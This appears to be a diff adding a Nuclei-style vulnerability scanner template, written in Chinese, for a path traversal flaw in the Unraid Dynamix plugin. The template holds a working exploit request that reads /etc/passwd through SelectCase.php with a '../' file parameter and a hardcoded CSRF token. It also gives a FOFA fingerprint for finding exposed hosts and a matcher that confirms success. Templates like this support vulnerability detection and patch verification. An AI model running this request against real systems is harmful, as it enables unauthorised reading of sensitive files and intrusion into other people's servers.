@@ -1,0 +1,26 @@
+id: unraid-nas-dynamix-file-read
+
+info:
+  name: "Unraid Dynamix插件文件访问控制缺陷路径遍历漏洞"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: "/webGui/images/banner.png"
+      该漏洞源于Unraid系统Dynamix插件未正确校验文件访问路径参数，攻击者可构造恶意请求通过目录遍历向量读取目标系统上的任意文件内容，可能导致敏感信息泄露。
+  tags: Unraid,Dynamix
+
+http:
+- raw:
+  - |
+    POST /plugins/dynamix/include/SelectCase.php?file=../../../../etc/passwd HTTP/1.1
+    Host: {{Hostname}}
+
+    csrf_token=9855BE5478D13A31&mode=get
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'root:x:0:0'
